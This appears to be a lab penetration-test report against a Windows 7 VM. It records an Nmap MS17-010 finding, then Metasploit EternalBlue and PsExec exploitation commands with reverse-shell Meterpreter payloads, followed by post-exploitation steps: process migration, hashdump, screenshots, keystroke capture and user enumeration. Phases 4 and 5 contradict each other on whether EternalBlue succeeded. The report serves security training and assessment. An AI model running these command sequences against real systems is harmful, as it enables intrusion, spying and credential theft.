           Port Service reported by Nmap

---

      `135/tcp` `msrpc`
      `139/tcp` `netbios-ssn`
      `445/tcp` `microsoft-ds`
    `49152/tcp` `unknown`
    `49153/tcp` `unknown`
    `49154/tcp` `unknown`
    `49155/tcp` `unknown`
    `49156/tcp` `unknown`
    `49157/tcp` `unknown`

Nmap reported 991 closed TCP ports and a live host.

The key host-script result was:

- Script: `smb-vuln-ms17-010`
- State: `VULNERABLE`
- Identifier shown in the scan output: `CVE-2017-0143`
- Risk factor: `HIGH`
- Description: Remote Code Execution vulnerability in Microsoft SMBv1
  servers (MS17-010)
- Disclosure date shown: `2017-03-14`

Additional script results:

---

Script Result Interpretation

---

`smb-vuln-ms10-061` `NT_STATUS_ACCESS_DENIED` The script could not
complete its check due
to access restrictions;
this is not a clean
negative result.

`smb-vuln-ms10-054` `false` The script did not
report this
vulnerability.

`samba-vuln-cve-2012-1182` `NT_STATUS_ACCESS_DENIED` The check was
restricted; the result
does not establish
whether the issue is
present.

---

**Assessment:** The Nmap output is the strongest direct vulnerability
evidence collected in this phase. It explicitly reports MS17-010 as
vulnerable. The exact CVE identifier printed by this Nmap script
(`CVE-2017-0143`) is preserved here as shown in the evidence file.

### 5.2 SearchSploit --- Windows 7 lookup

The broad `searchsploit windows 7` lookup returned numerous
Windows-related exploit references. Relevant results included
EternalBlue entries:

---

Exploit title (shortened) Exploit-DB path

---

Windows 7 / 2008 R2 --- EternalBlue `windows/remote/42031.py`
SMB Remote Code Execution  
 (MS17-010)

Windows 7 / 8.1 / Server variants `windows/remote/42315.py`
--- EternalBlue SMB Remote Code  
 Execution (MS17-010)

Windows 8 / 8.1 / Server variants `windows_x86-64/remote/42030.py`
(x64) --- EternalBlue SMB Remote  
 Code Execution (MS17-010)

---

This search establishes that the local Exploit-DB index contains
references associated with Windows 7 and MS17-010. A SearchSploit match
is a research reference; it does not prove that a particular exploit
will succeed against the target.

### 5.3 SearchSploit --- EternalBlue

The focused EternalBlue search returned three entries:

1.  Windows 7 / 2008 R2 --- `windows/remote/42031.py`
2.  Windows 7 / 8.1 / 2008 R2 / 2012 R2 / 2016 R2 ---
    `windows/remote/42315.py`
3.  Windows 8 / 8.1 / 2012 R2 (x64) --- `windows_x86-64/remote/42030.py`

The output reported `Shellcodes: No Results`.

The first two records explicitly include Windows 7 in their
affected-platform descriptions. This makes them relevant references for
further controlled research, but their presence in Exploit-DB is not
proof of compatibility with this specific VM, its architecture, or its
patch state.

### 5.4 SearchSploit --- MS17-010

The focused MS17-010 search returned six records:

---

Exploit title (shortened) Exploit-DB path

---

EternalRomance / EternalSynergy / `windows/remote/43970.rb`
EternalChampion SMB Remote Code  
 Execution (Metasploit)

SMB Remote Code Execution Scanner `windows/dos/41891.rb`
(Metasploit)

Windows 7 / 2008 R2 --- EternalBlue `windows/remote/42031.py`
SMB Remote Code Execution

Windows 7 / 8.1 / Server variants `windows/remote/42315.py`
--- EternalBlue SMB Remote Code  
 Execution

Windows 8 / 8.1 / 2012 R2 (x64) --- `windows_x86-64/remote/42030.py`
EternalBlue SMB Remote Code  
 Execution

Windows Server 2008 R2 (x64) --- `windows_x86-64/remote/41987.py`
SrvOs2FeaToNt SMB Remote Code  
 Execution

---

The output reported `Shellcodes: No Results`.

These results corroborate that several public references exist for the
MS17-010 family. They do not represent additional vulnerability tests
against the target.

### 5.5 Exploit-DB update attempt

The update log showed the following:

- The updater attempted to use Kali package management for `exploitdb`
  and `exploitdb-papers`.
- The system repeatedly reported
  `Temporary failure resolving 'http.kali.org'`.
- The `exploitdb` package was reported as already the newest version:
  `20260904-0kali1`.
- The `exploitdb-papers` package download failed because the
  repository host could not be resolved.
- The update process ended with an apt upgrade issue.

**Assessment:** The installed `exploitdb` package was already at the
newest version known to the local package manager, but the update
attempt was affected by DNS/network failure. Therefore, the evidence
does not confirm that the local exploit database was fully synchronized
with the latest online repository.

### 5.6 Metasploit module search

The Metasploit search returned three related modules:

---

Module Rank shown `Check` column Relevant output

---

`exploit/windows/smb/ms17_010_eternalblue` `average` `Yes` Includes a
`Windows 7`
target option.

`exploit/windows/smb/ms17_010_psexec` `normal` `Yes` Listed as an
MS17-010 SMB
remote code
execution module.

`exploit/windows/smb/smb_doublepulsar_rce` `great` `Yes` Listed as an SMB
DOUBLEPULSAR
remote code
execution module.

---

The EternalBlue module listed target choices including Automatic Target,
Windows 7, Windows Embedded Standard 7, Windows Server 2008 R2, Windows
8, Windows 8.1, Windows Server 2012, Windows 10 Pro, and Windows 10
Enterprise Evaluation.

**Important interpretation:** The `Check: Yes` column indicates that a
module supports a check capability. It does not mean that a check was
run against `192.168.56.103` or that Metasploit independently confirmed
the target as vulnerable. The command performed a module search only; no
module was selected or executed.

## 6. Overall Risk Assessment

---

Finding Evidence Assessment

---

MS17-010 / SMBv1 Nmap `smb-vuln-ms17-010` **High --- scanner
exposure result reported VULNERABLE**

SMB service exposure TCP 445 open SMB is reachable on the
target and warrants
remediation/restriction.

RPC / NetBIOS exposure TCP 135 and 139 open Additional exposed
services to review and
restrict as appropriate.

Other SMB script checks `NT_STATUS_ACCESS_DENIED` Inconclusive checks; do
results not treat access-denied
results as proof of
safety.

EternalBlue exploit SearchSploit results and Relevant public exploit
references Metasploit module listing references exist;
exploitability was not
tested.

Exploit-DB freshness Update log Online update was not
fully verified because of
DNS failure.

---

### 6.1 Confirmed versus unconfirmed items

**Confirmed by the collected evidence:**

- The target was reachable during the Nmap scan.
- TCP 445 was open.
- Nmap's `smb-vuln-ms17-010` script reported `VULNERABLE` with HIGH
  risk.
- SearchSploit returned EternalBlue and MS17-010 references.
- Metasploit listed modules associated with MS17-010.

**Not confirmed by this phase:**

- Successful exploitation or remote code execution.
- A reverse shell or interactive session.
- The exact patch level of the target beyond the earlier OS
  identification.
- Whether MS08-067 or CVE-2019-0708 (BlueKeep) is present.
- Whether access-denied SMB checks would report a vulnerability if run
  with appropriate authorized credentials.
- Whether the local Exploit-DB database is fully current with the
  online repository.

## 7. Recommendations

1.  **Prioritize MS17-010 remediation.** Apply the appropriate security
    updates to supported systems. Windows 7 is end-of-life; migrate the
    host to a currently supported operating system.
2.  **Disable SMBv1 where it is not required.** Prefer modern SMB
    versions and remove legacy protocol dependencies.
3.  **Restrict SMB network access.** Limit TCP 445 to trusted systems
    and required management paths; do not expose SMB to untrusted
    networks.
4.  **Review RPC and NetBIOS exposure.** Restrict TCP 135 and 139 where
    they are not needed.
5.  **Resolve the Kali repository DNS/network issue.** Retry the package
    update when repository connectivity is restored, then record the
    successful update output.
6.  **Repeat validation after remediation.** Re-run the Nmap
    vulnerability scan and retain the new output to verify whether the
    MS17-010 finding is cleared.
7.  **Preserve the lab snapshot.** Keep a clean VM snapshot before any
    further authorized validation.

## 8. Evidence Inventory

---

Evidence file Description

---

`vuln-sweep-01.txt` Nmap vulnerability scan output

`searchsploit-windows7-02(1).txt` Broad Windows 7 SearchSploit lookup

`eternalblue-03.txt` Focused EternalBlue SearchSploit
results

`ms17-010-04.txt` Focused MS17-010 SearchSploit
results

`searchsploit-update-05.txt` Exploit-DB update attempt and error
output

`metasploit-ms17-010-06.txt` Metasploit MS17-010 module search
results

---

## 9. Conclusion

Phase 3 identified a significant SMB security issue on the Windows 7 lab
target. Nmap explicitly reported the host as vulnerable to MS17-010 with
a HIGH risk factor. SearchSploit and Metasploit searches found relevant
EternalBlue/MS17-010 exploit references, including a Metasploit module
that lists Windows 7 as a target option.

The evidence supports prioritizing SMBv1/MS17-010 remediation and
subsequent re-scanning. It does **not** establish that exploitation was
successful: this phase consisted of vulnerability scanning and
exploit-reference research only. The Exploit-DB update also remains
partially unverified because the Kali repository could not be resolved
during the update attempt.

---

**Report status:** Phase 3 vulnerability analysis documented.\
**Next phase:** Proceed only after reviewing the findings, preserving
the lab snapshot, and defining the scope for any further authorized
validation.

# Phase 4 — Exploitation and Access Validation

**Project:** Windows 7 Vulnerability Assessment and Penetration Testing  
**Phase:** 04 — Exploitation and Access Validation  
**Target Operating System:** Windows 7 Ultimate SP1 (64-bit)  
**Target IP:** `192.168.56.103`  
**Attacker Machine:** Kali Linux  
**Attacker IP:** `192.168.56.102`  
**SMB Port:** `445/tcp`  
**Framework:** Metasploit Framework 6.5.3-dev  
**Date:** November 23, 2026

---

## 1. Introduction

The objective of Phase 4 was to validate the vulnerabilities identified during Phase 3 by conducting controlled exploitation attempts against the Windows 7 target machine.

The primary focus was the MS17-010 vulnerability, commonly associated with EternalBlue, affecting Microsoft's SMBv1 implementation.

Three Metasploit modules were examined:

1. `ms17_010_eternalblue`
2. `ms17_010_psexec`
3. `smb_doublepulsar_rce`

Before testing the exploitation modules, Windows commands were executed on the target machine to identify the current user, available accounts, administrator group membership, computer name, and domain/workgroup configuration.

All activities were conducted within the project's isolated virtual lab environment.

## 2. Lab Environment

| Component              | Configuration          |
| ---------------------- | ---------------------- |
| Attacker OS            | Kali Linux             |
| Target OS              | Windows 7 Ultimate SP1 |
| Target Architecture    | x64                    |
| Target IP              | 192.168.56.103         |
| Attacker IP            | 192.168.56.102         |
| SMB Service            | TCP/445                |
| Exploitation Framework | Metasploit             |
| Primary Vulnerability  | MS17-010               |

## 3. Windows Target Enumeration

Before attempting additional exploitation, several commands were executed directly on the Windows 7 machine to understand its local security configuration.

### 3.1 Identify the Current User

**Command:**

```cmd
whoami
```

**Result:**

```text
windows7\vboxuser
```

**Status:** SUCCESS

**Finding:**

The currently logged-in account was identified as `vboxuser` on the computer named `WINDOWS7`.

This information was useful when configuring the SMB username for subsequent authentication testing.

### 3.2 Identify Available User Accounts

**Command:**

```cmd
net user
```

**Result:**

```text
User accounts for \\WINDOWS7

Administrator
Guest
vboxuser

The command completed successfully.
```

**Status:** SUCCESS

**Finding:**

Three local user accounts were identified:

- Administrator
- Guest
- vboxuser

The command successfully enumerated the local accounts.

### 3.3 Identify Local Administrator Group Members

**Command:**

```cmd
net localgroup administrators
```

**Result:**

```text
Alias name     administrators

Members

Administrator
vboxuser

The command completed successfully.
```

**Status:** SUCCESS

**Finding:**

The `vboxuser` account was found in the local Administrators group.

This established that the account had local administrator group membership. However, group membership alone does not establish that its credentials are valid for remote SMB authentication or that every operation will receive elevated privileges.

### 3.4 Identify Computer and Workstation Information

**Command:**

```cmd
net config workstation
```

**Important Output:**

```text
Computer name              \\WINDOWS7
Full Computer name         Windows7
User name                  vboxuser

Software version           Windows 7 Ultimate

Workstation domain         WORKGROUP
Logon domain               WINDOWS7
```

**Status:** SUCCESS

**Finding:**

The command provided the following information:

- Computer name: `WINDOWS7`
- Current user: `vboxuser`
- Workstation domain/workgroup: `WORKGROUP`
- Logon domain: `WINDOWS7`
- Operating system: Windows 7 Ultimate

This helped distinguish the workgroup name from the local computer's logon context.

### 3.5 Verify Domain Information

**Command:**

```cmd
systeminfo | findstr /B /C:"Domain"
```

**Result:**

```text
Domain: WORKGROUP
```

**Status:** SUCCESS

**Finding:**

The command independently confirmed that the machine belonged to the `WORKGROUP` workgroup rather than an Active Directory domain.

This information was recorded for the SMB authentication configuration.

### 3.6 Windows Enumeration Summary

| Windows Command                        | Purpose                                   | Result  |
| -------------------------------------- | ----------------------------------------- | ------- |
| `whoami`                               | Identify current user                     | SUCCESS |
| `net user`                             | Enumerate local accounts                  | SUCCESS |
| `net localgroup administrators`        | Identify administrator group members      | SUCCESS |
| `net config workstation`               | Identify computer and workstation details | SUCCESS |
| `systeminfo \| findstr /B /C:"Domain"` | Identify domain/workgroup                 | SUCCESS |

All five Windows enumeration commands executed successfully.

---

## 4. Metasploit Exploitation

After completing Windows enumeration, the exploitation phase continued using Metasploit on Kali Linux.

### 4.1 Launch Metasploit

**Command:**

```bash
msfconsole
```

**Status:** SUCCESS

Metasploit Framework 6.5.3-dev successfully launched.

An unusual kernel-panic-style message appeared during startup. However, the Metasploit console subsequently loaded and remained operational.

### 4.2 Exploit 1 — MS17-010 EternalBlue

**Module:**

```text
exploit/windows/smb/ms17_010_eternalblue
```

**Objective:**

To validate and exploit the MS17-010 SMBv1 remote code execution vulnerability identified during Phase 3.

**Step 1: Select the module**

```text
use exploit/windows/smb/ms17_010_eternalblue
```

**Step 2: Display module options**

```text
show options
```

The module initially selected the following default payload:

```text
windows/x64/meterpreter/reverse_tcp
```

**Step 3: Configure the target IP**

```text
set RHOSTS 192.168.56.103
```

**Step 4: Configure the attacker's IP**

```text
set LHOST 192.168.56.102
```

**Step 5: Verify configuration**

```text
show options
```

Important configuration:

| Option  | Value                               |
| ------- | ----------------------------------- |
| RHOSTS  | 192.168.56.103                      |
| RPORT   | 445                                 |
| LHOST   | 192.168.56.102                      |
| LPORT   | 4444                                |
| Payload | windows/x64/meterpreter/reverse_tcp |

**Step 6: Execute the exploit**

```text
run
```

**Important Output:**

```text
[+] Host is likely VULNERABLE to MS17-010!
[+] The target is vulnerable.
[+] Connection established for exploitation.
[+] Target OS selected valid for OS indicated by SMB reply.
[+] Target arch selected valid for arch indicated by DCE/RPC reply.

[+] ETERNALBLUE overwrite completed successfully!

[*] Meterpreter session 1 opened
(192.168.56.102:4444 -> 192.168.56.103:49158)

[+] WIN
```

**Status: SUCCESS**

**Finding:**

The EternalBlue exploitation attempt successfully established a Meterpreter session with the Windows 7 target.

The Metasploit output confirmed:

- The target was vulnerable to MS17-010.
- The target was identified as Windows 7 Ultimate SP1 x64.
- The exploitation process completed successfully.
- A reverse TCP connection was established.
- Meterpreter session 1 was opened.

This was the primary successful exploitation result of Phase 4.

### 4.3 Exploit 2 — MS17-010 PsExec

**Module:**

```text
exploit/windows/smb/ms17_010_psexec
```

**Objective:**

To investigate whether the MS17-010 PsExec module could establish remote access using SMB authentication.

**Step 1: Select the module**

```text
use exploit/windows/smb/ms17_010_psexec
```

**Step 2: Initial payload configuration attempt**

```text
set windows/meterpreter/reverse_tcp
```

**Result:**

```text
[-] Unknown datastore option:
windows/meterpreter/reverse_tcp
```

**Status: FAILED — Incorrect Command Syntax**

The payload name was entered without specifying the `PAYLOAD` option.

**Step 3: Correct the payload configuration**

```text
set payload windows/meterpreter/reverse_tcp
```

**Result:**

```text
payload => windows/meterpreter/reverse_tcp
```

**Status: SUCCESS**

The payload was correctly configured.

**Step 4: Display module options**

```text
show options
```

The module displayed the following relevant options:

| Option    | Initial Setting |
| --------- | --------------- |
| RHOSTS    | Empty           |
| RPORT     | 445             |
| SHARE     | ADMIN$          |
| SMBDomain | .               |
| SMBUser   | Empty           |
| SMBPass   | Empty           |
| LHOST     | 127.0.0.1       |
| LPORT     | 4444            |

**Step 5: Configure the target**

```text
set rhosts 192.168.56.103
```

**Step 6: Configure the attacker IP**

```text
set lhost 192.168.56.102
```

**Step 7: Verify the configuration**

```text
show options
```

**Step 8: Configure the discovered Windows username**

Based on the Windows enumeration results:

```text
set smbuser vboxuser
```

**Step 9: Configure the local authentication context**

```text
set smbdomain .
```

The dot (`.`) was used to indicate the local machine authentication context.

The Windows enumeration had identified:

- Computer name: `WINDOWS7`
- User account: `vboxuser`
- Workgroup: `WORKGROUP`
- Logon domain: `WINDOWS7`

No SMB password was supplied.

**Step 10: Execute the module**

```text
run
```

**Important Output:**

```text
[*] Started reverse TCP handler on 192.168.56.102:4444

[*] Authenticating to 192.168.56.103
as user 'vboxuser'...

[-] Rex::Proto::SMB::Exceptions::LoginError:
Login Failed: The server responded with error:
STATUS_LOGON_FAILURE

[*] Exploit completed, but no session was created.
```

**Status: FAILED — SMB Authentication**

**Finding:**

The PsExec module successfully accepted the target IP, attacker IP, username, and local authentication context.

However, the target rejected the SMB authentication attempt with:

```text
STATUS_LOGON_FAILURE
```

No Meterpreter session was created.

The attempted authentication did not establish whether the supplied username/password combination was valid. The password was not provided, so successful authentication could not be demonstrated.

The failure should therefore be recorded as an authentication failure, not as proof that MS17-010 was absent.

### 4.4 Exploit 3 — DoublePulsar RCE

**Module:**

```text
exploit/windows/smb/smb_doublepulsar_rce
```

**Objective:**

To examine the DoublePulsar remote code execution module and determine whether it could establish a session with the Windows 7 target.

**Step 1: Select the module**

```text
use exploit/windows/smb/smb_doublepulsar_rce
```

**Step 2: Display module options**

```text
show options
```

The module displayed:

| Option  | Initial Setting                     |
| ------- | ----------------------------------- |
| RHOSTS  | Empty                               |
| RPORT   | 445                                 |
| Payload | windows/x64/meterpreter/reverse_tcp |
| LHOST   | Empty                               |
| LPORT   | 4444                                |

**Step 3: Configure the target**

```text
set rhosts 192.168.56.103
```

**Step 4: Configure the attacker IP**

```text
set lhost 192.168.56.102
```

**Step 5: Verify configuration**

```text
show options
```

**Step 6: Execute the module**

```text
run
```

**Important Output:**

```text
[*] Started reverse TCP handler on 192.168.56.102:4444

[-] Exploit aborted due to failure: bad-config:

Are you SURE you want to execute code
against a nation-state implant?

You MAY contaminate forensic evidence
if there is an investigation.

Disable the DefangedMode option
if you have authorization to proceed.

[*] Exploit completed, but no session was created.
```

**Status: BLOCKED — Metasploit Safety Protection**

**Finding:**

The DoublePulsar module accepted the target and listener configuration, but Metasploit's built-in DefangedMode safety protection blocked execution.

No Meterpreter session was created.

Importantly, the presence of the DoublePulsar implant was not established during this test. The module's rank or availability does not demonstrate that the target contains the implant.

The result was therefore recorded as a blocked exploitation attempt rather than a successful or confirmed vulnerability.

---

## 5. Consolidated Exploitation Results

The following table summarizes the three exploitation attempts.

| Exploit Module       | Result  | Explanation                                      |
| -------------------- | ------- | ------------------------------------------------ |
| MS17-010 EternalBlue | SUCCESS | Meterpreter session established                  |
| MS17-010 PsExec      | FAILED  | SMB authentication returned STATUS_LOGON_FAILURE |
| DoublePulsar RCE     | BLOCKED | Metasploit DefangedMode protection               |

### 5.1 Successful Exploitation

The EternalBlue module was the only module that successfully established remote Meterpreter access during the recorded tests.

**Session information:**

```text
Session ID: 1

Attacker:
192.168.56.102:4444

Target:
192.168.56.103:49158

Payload:
windows/x64/meterpreter/reverse_tcp
```

This confirmed successful remote code execution against the Windows 7 lab target through the MS17-010 vulnerability.

### 5.2 Unsuccessful Exploitation Attempts

**PsExec:**

The module reached the SMB authentication stage but failed because the target returned `STATUS_LOGON_FAILURE`.

**DoublePulsar:**

Metasploit prevented execution through its DefangedMode safety mechanism. No evidence was obtained to confirm an existing DoublePulsar implant.

Neither unsuccessful attempt should be classified as a successful compromise.

---

## 6. Complete Command Reference

This section consolidates the commands used throughout Phase 4.

### 6.1 Windows Enumeration Commands

```cmd
whoami

net user

net localgroup administrators

net config workstation

systeminfo | findstr /B /C:"Domain"
```

### 6.2 Metasploit — EternalBlue

```text
msfconsole

use exploit/windows/smb/ms17_010_eternalblue

show options

set RHOSTS 192.168.56.103

set LHOST 192.168.56.102

show options

run
```

### 6.3 Metasploit — PsExec

```text
msfconsole

use exploit/windows/smb/ms17_010_psexec

set windows/meterpreter/reverse_tcp

set payload windows/meterpreter/reverse_tcp

show options

set rhosts 192.168.56.103

set lhost 192.168.56.102

show options

set smbuser vboxuser

set smbdomain .

run
```

Note: The first payload command was an unsuccessful syntax attempt. The second command correctly configured the payload.

### 6.4 Metasploit — DoublePulsar

```text
msfconsole

use exploit/windows/smb/smb_doublepulsar_rce

show options

set rhosts 192.168.56.103

set lhost 192.168.56.102

show options

run
```

---

## 7. Key Findings

The following findings were established during Phase 4:

1. The target was identified as Windows 7 Ultimate SP1, 64-bit.
2. The current Windows account was identified as `vboxuser`.
3. The `vboxuser` account was listed in the local Administrators group.
4. The machine belonged to the `WORKGROUP` workgroup.
5. The MS17-010 EternalBlue module successfully exploited the target.
6. A reverse Meterpreter session was successfully established.
7. The PsExec attempt failed at the SMB authentication stage.
8. The DoublePulsar attempt was blocked by Metasploit's safety protection.
9. No successful DoublePulsar execution was demonstrated.

## 8. Conclusion

Phase 4 successfully demonstrated the exploitation of the Windows 7 target through the MS17-010 EternalBlue vulnerability.

The successful Meterpreter session provided practical evidence that the identified SMB vulnerability could result in remote code execution and unauthorized access within the tested lab environment.

The additional PsExec and DoublePulsar tests provided useful information about SMB authentication requirements and Metasploit's built-in execution safeguards.

Although only one of the three exploitation modules successfully established a session, the results provided sufficient evidence to validate the primary MS17-010 finding.

**Primary outcome:** Successful exploitation of Windows 7 through EternalBlue (MS17-010), resulting in Meterpreter session 1.

---

## 9. Phase 4 Status

- [x] Windows current-user identification
- [x] Local account enumeration
- [x] Administrator group enumeration
- [x] Computer and workgroup identification
- [x] Domain information verification
- [x] Metasploit initialization
- [x] EternalBlue module configuration
- [x] EternalBlue exploitation successful
- [x] Meterpreter session established
- [x] PsExec module tested
- [x] PsExec authentication failure documented
- [x] DoublePulsar module tested
- [x] DoublePulsar safety block documented
- [x] Exploitation results consolidated
- [x] Phase 4 findings documented

**Phase 4 completed.**

**Next Phase:** Phase 5 — Post-Exploitation, Impact Assessment, and Security Recommendations.

# Phase 5 — Post-Exploitation and Access Recovery

**Project:** Windows 7 Vulnerability Assessment and Penetration Testing  
**Attacker Machine:** Kali Linux  
**Target Machine:** Windows 7 Ultimate SP1 (x64)  
**Target IP:** `192.168.56.103`  
**Attacker IP:** `192.168.56.102`  
**SMB Port:** `445/TCP`  
**Meterpreter Listening Port:** `4444/TCP`  
**Environment:** Isolated VirtualBox lab network  
**Assessment Type:** Authorized penetration testing

---

## 5.1 Phase Overview

The objective of Phase 5 was to perform post-exploitation activities after obtaining remote access to the Windows 7 target.

The assessment included:

- Recovering remote access using an alternative Metasploit exploitation module.
- Establishing a Meterpreter session.
- Identifying the compromised operating system and architecture.
- Verifying the current user and privilege level.
- Inspecting running processes.
- Testing process migration.
- Attempting to retrieve local account password hashes.
- Capturing a screenshot of the target.
- Testing the Meterpreter keystroke-capture functionality.
- Enumerating currently and recently logged-on users.
- Reviewing available SMB shares and network services.
- Testing persistence functionality and documenting its outcome.

An important development occurred during this phase: the original EternalBlue exploitation attempt did not provide the expected access. Rather than assuming that the target was exploitable through MS17-010, an alternative credential-based approach was used.

The `exploit/windows/smb/psexec` module successfully established a new Meterpreter session.

---

## 5.2 Windows 7 Updates and Their Impact on Testing

Before continuing exploitation, two Microsoft update packages were installed on the Windows 7 virtual machine.

The update files included:

- `windows6.1-kb4474419-v3-x64`
- `windows6.1-kb4490628-x64`

These updates were subsequently visible in the Windows update inventory.

The installed updates were confirmed using the following Windows command:

```cmd
wmic qfe get HotFixID
```

The output included:

```text
HotFixID

KB2534111
KB4019990
KB4474419
KB4490628
KB976902
```

Additional operating system information was collected:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Observed output:

```text
OS Name:       Microsoft Windows 7 Ultimate
OS Version:    6.1.7601 Service Pack 1 Build 7601
System Type:   x64-based PC
```

The target remained Windows 7 Ultimate Service Pack 1, 64-bit.

**Important assessment observation:**

The installation of these two updates changed the software state of the Windows 7 machine. However, neither KB4474419 nor KB4490628 should be treated as proof that MS17-010 was installed or remediated.

The exact reason for the unsuccessful EternalBlue attempt was not established during this assessment.

The following should therefore be recorded separately:

1. Windows 7 was updated with two Microsoft update packages.
2. The original EternalBlue exploitation attempt was unsuccessful.
3. The exact MS17-010 patch status was not conclusively established by the evidence collected.
4. The absence of a configured password was not the cause of an EternalBlue failure.

---

## 5.3 Recovery of Remote Access Using PsExec

### 5.3.1 Reason for Using an Alternative Module

After the initial exploitation attempt did not produce the expected access through EternalBlue, an alternative approach was selected.

The Metasploit module:

```text
exploit/windows/smb/psexec
```

was used to establish access through SMB authentication.

Unlike EternalBlue, this approach relies on valid SMB credentials and the ability to execute commands remotely on the target.

The previously configured Windows account credentials were used for the authorized lab assessment.

### 5.3.2 Selecting the Module

Metasploit was started:

```bash
msfconsole
```

The PsExec module was selected:

```text
use exploit/windows/smb/psexec
```

The module configuration was reviewed:

```text
show options
```

### 5.3.3 Configuring the Target

The target address was configured:

```text
set RHOSTS 192.168.56.103
```

The SMB username was:

```text
set SMBUser vboxuser
```

The SMB password was:

```text
set SMBPass kali
```

The reverse TCP Meterpreter payload was configured:

```text
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

The Kali machine's IP address was configured as the callback address:

```text
set LHOST 192.168.56.102
```

The listening port was configured:

```text
set LPORT 4444
```

The exit function was:

```text
set EXITFUNC thread
```

The module was then executed:

```text
run
```

### 5.3.4 Successful Access Recovery

The following output was observed:

```text
Started reverse TCP handler on 192.168.56.102:4444

192.168.56.103:445 - Connecting to the server...
192.168.56.103:445 - Authenticating to 192.168.56.103:445
as user 'vboxuser'...

192.168.56.103:445 - Selecting PowerShell target
192.168.56.103:445 - Executing the payload...

Service start timed out, OK if running a command
or non-service executable...

Sending stage (255678 bytes) to 192.168.56.103

Meterpreter session 1 opened
(192.168.56.102:4444 -> 192.168.56.103:49158)
```

**Result: SUCCESS**

A new Meterpreter session was successfully established.

The successful connection demonstrated that:

- The Windows 7 target was reachable over SMB.
- SMB authentication using the configured credentials succeeded.
- The PsExec module successfully executed the payload.
- The reverse TCP connection reached the Kali machine.
- A new Meterpreter session was established.

This was the principal access-recovery achievement of Phase 5.

---

## 5.4 Backgrounding the Meterpreter Session

After obtaining access, the session was placed in the background:

```text
background
```

Observed output:

```text
Backgrounding session 1...
```

This returned control to the Metasploit console and allowed additional post-exploitation modules to be selected.

The session remained available as Session 1.

---

## 5.5 System Information Enumeration

The operating system information was collected from the Meterpreter session.

Command:

```text
sysinfo
```

Observed output:

```text
Computer       : WINDOWS7
OS             : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture   : x64
System Language: en_US
Domain         : WORKGROUP
Logged On Users: 2
Meterpreter    : x64/windows
```

### Findings

The output confirmed:

- The compromised machine was Windows 7.
- The operating system was Service Pack 1.
- The architecture was 64-bit.
- The target belonged to the WORKGROUP environment.
- The Meterpreter session used a 64-bit Windows payload.

This confirmed that the recovered session was communicating with the intended target.

---

## 5.6 User and Privilege Enumeration

The current security context was checked using:

```text
getuid
```

Observed output:

```text
Server username: NT AUTHORITY\SYSTEM
```

The privilege escalation functionality was also checked:

```text
getsystem
```

Observed output:

```text
[-] Already running as SYSTEM
```

### Findings

The session was already operating under:

```text
NT AUTHORITY\SYSTEM
```

This is the highest local Windows service security context.

Consequently, an additional privilege escalation attempt was unnecessary.

**Result: SYSTEM-level privileges were confirmed.**

---

## 5.7 Process Enumeration

The running processes were inspected using:

```text
ps
```

The process listing included the following entries:

|  PID | Process           | User                |
| ---: | ----------------- | ------------------- |
|    4 | System            | NT AUTHORITY\SYSTEM |
|  272 | smss.exe          | NT AUTHORITY\SYSTEM |
|  360 | csrss.exe         | NT AUTHORITY\SYSTEM |
|  404 | wininit.exe       | NT AUTHORITY\SYSTEM |
|  424 | csrss.exe         | NT AUTHORITY\SYSTEM |
|  476 | winlogon.exe      | NT AUTHORITY\SYSTEM |
|  492 | services.exe      | NT AUTHORITY\SYSTEM |
|  528 | lsass.exe         | NT AUTHORITY\SYSTEM |
| 1220 | SearchIndexer.exe | NT AUTHORITY\SYSTEM |
| 1244 | spoolsv.exe       | NT AUTHORITY\SYSTEM |
| 1428 | explorer.exe      | WINDOWS7\vboxuser   |
| 1560 | VBoxTray.exe      | WINDOWS7\vboxuser   |

The process listing was used to identify available processes and their associated security contexts.

The `explorer.exe` process, PID 1428, was subsequently selected for a process migration test.

---

## 5.8 Process Migration

The Meterpreter process migration functionality was tested.

Command:

```text
migrate 1428
```

Observed output:

```text
Migrating from 1244 to 1428...

Migration completed successfully.
```

The current process ID was subsequently checked:

```text
getpid
```

Observed output:

```text
Current pid: 1428
```

### Findings

The migration from process ID 1244 to process ID 1428 completed successfully.

The target process was:

```text
explorer.exe
```

The process was associated with the logged-in Windows account:

```text
WINDOWS7\vboxuser
```

**Important:** The screenshots confirm that migration succeeded, but they do not independently establish the security context after migration. The privilege level should be rechecked after migration when reproducing this test.

---

## 5.9 Password Hash Retrieval Attempt

The Meterpreter hash retrieval functionality was tested using:

```text
hashdump
```

Observed output:

```text
[-] priv_passwd_get_sam_hashes:
Operation failed: 1168
```

### Result: FAILED

The attempt to retrieve local SAM password hashes was unsuccessful.

The error code 1168 indicates that the requested element could not be found.

Although the session had previously confirmed SYSTEM-level privileges, hash retrieval still failed.

Possible areas requiring further investigation include:

- Access to the relevant SAM and SYSTEM registry data.
- Compatibility between the target and the Meterpreter implementation.
- The state of the target's security subsystems.
- Whether the required data was accessible to the session.

No password hashes were successfully retrieved in the captured evidence.

This should be documented as a failed post-exploitation activity rather than a successful credential extraction.

---

## 5.10 Target Screenshot Capture

The Meterpreter screenshot functionality was tested.

Command:

```text
screenshot
```

Observed output:

```text
Screenshot saved to:
/home/kali/0hRJpIMU.jpeg
```

### Result: SUCCESS

A screenshot of the Windows 7 target was captured and saved on the Kali machine.

The screenshot provided visual evidence of the target's desktop environment.

The resulting file was:

```text
/home/kali/0hRJpIMU.jpeg
```

This evidence can be retained in the assessment's screenshot directory.

---

## 5.11 Keystroke-Capture Functionality Test

The Meterpreter keystroke-capture functionality was also tested.

The capture function was started:

```text
keyscan_start
```

Observed output:

```text
Starting the keystroke sniffer ...
```

The retrieval function was then invoked:

```text
keyscan_dump
```

Observed output:

```text
Dumping captured keystrokes...
```

### Result: INCONCLUSIVE

The screenshots show that the commands were accepted and the capture operation was initiated.

However, no actual captured keystrokes are visible in the provided evidence.

Therefore, the assessment cannot claim that passwords or other user input were successfully captured.

The test should be recorded as a functionality test with no confirmed captured data.

---

## 5.12 Logged-On User Enumeration

The Meterpreter session was placed in the background and the following Metasploit post-exploitation module was selected:

```text
use post/windows/gather/enum_logged_on_users
```

The module configuration was inspected:

```text
show options
```

The available options included:

| Option  | Setting | Description                         |
| ------- | ------- | ----------------------------------- |
| CURRENT | true    | Enumerate currently logged-on users |
| RECENT  | true    | Enumerate recently logged-on users  |
| SESSION | -1      | Session to run the module on        |

The Meterpreter session was specified:

```text
set SESSION 1
```

The module was executed:

```text
run
```

